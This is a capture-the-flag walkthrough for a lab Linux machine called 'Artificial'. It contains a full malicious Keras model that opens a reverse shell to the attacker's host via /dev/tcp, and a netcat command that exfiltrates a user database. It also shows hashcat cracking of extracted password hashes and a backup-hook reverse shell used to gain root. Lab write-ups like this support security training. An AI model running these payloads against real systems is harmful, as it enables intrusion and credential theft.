# Artificial

Linux machine

## Foothold

```
nmap -sV -v 10.10.11.74
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Update etc hosts.

We see some example code - copy it.

Now, let's register and login. We can see that we can upload a file and some instructions for creating the .h5 file.

Use uv to create env with python 3.8. Download the wheel file from the Dockerfile and install numpy, pandas, and the downloaded tensorflow.

Now, search for tensorflow vulnerabilities. We find that Keras is vulnerable to CVE-2024-3660 on model loading - RCE https://nvd.nist.gov/vuln/detail/CVE-2024-3660

the commit that shows the fix https://github.com/keras-team/keras/commit/8a624b447146b9cf6596267c5447f1cd79ce183b
writeup for exploiting https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass or here https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

Here is the updated code:
```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

def exploit(x):
    import os
    os.system("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.3/1234 0>&1'")
    return x

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

model.add(tf.keras.layers.Lambda(exploit))

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')

```

Upload the file, start netcat, and interact with the model on the website.

## User

Once we are in, we can see there is a sqlite used in the `app.py`.

on server (receiver):
```bash
nc -l -p 1234 -q 1 > users.db < /dev/null
```

On the victim:
```bash
cat instance/users.db | netcat server.ip.here 1234
```

list sqlite tables:
```bash
SELECT name FROM sqlite_master WHERE type='table';
```

list all users:
```bash
SELECT * FROM user;
```

create hashes.txt:
```
cat hashes.txt                                                                                                                                                                                       
gael:c99175974b6e192936d97224638a34f8
mark:0f3d8c76530022670f1c6029eed09ccb
robert:b606c5f5136170f15444251665638b36
royer:bc25b1f80f544c0ab451c02a3dca9fc6
mary:bf041041e57f1aff3be7ea1abd6129d0
':757b3fc0f965530c5ba9f67d25eb64a8
ciao:6e6bc4e49dd477ebc98ef4046c067b5f
asd:7815696ecbf1c96e6894b779456d330e
```

```bash
hashcat --user hashes.txt /usr/share/wordlists/rockyou.txt.gz
```

```bash
hashcat --user -m 0 hashes.txt /usr/share/wordlists/rockyou.txt.gz
```
We get:

```
7815696ecbf1c96e6894b779456d330e:asd                      
6e6bc4e49dd477ebc98ef4046c067b5f:ciao                     
757b3fc0f965530c5ba9f67d25eb64a8:'''                      
c99175974b6e192936d97224638a34f8:mattp005numbertwo        
bc25b1f80f544c0ab451c02a3dca9fc6:marwinnarak043414036
```
Log in as gael using SSH.

## Root

Checkout the /opt directory, we can see it contains backrest. interesting file is `config.json` https://garethgeorge.github.io/backrest/introduction/getting-started/.

Forward the backrest to localhost:
```bash
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

Download linpeas

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```
./linepeas.sh
```

linpeas tells us there is a readable backup directory in /var/backups of the configuration
```
cp /var/backups/backrest_backup.tar.gz /tmp/.sad/
tar -xf ./backrest_backup.tar.gz
```

We now have the username and password:
```
cat .config/backrest/config.json 
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
gael@artificial:/tmp/.sad/backrest$ echo JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP | base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

create hashes_backrest.txt
```
backrest_root:$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```
hashcat
```
hashcat --user hashes_backrest.txt /usr/share/wordlists/rockyou.txt.gz
```
```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```

Once you have the password and username, create a repository and a plan. Attach a reverse shell by adding a hook to the plan. Start a listener and run the backup now.
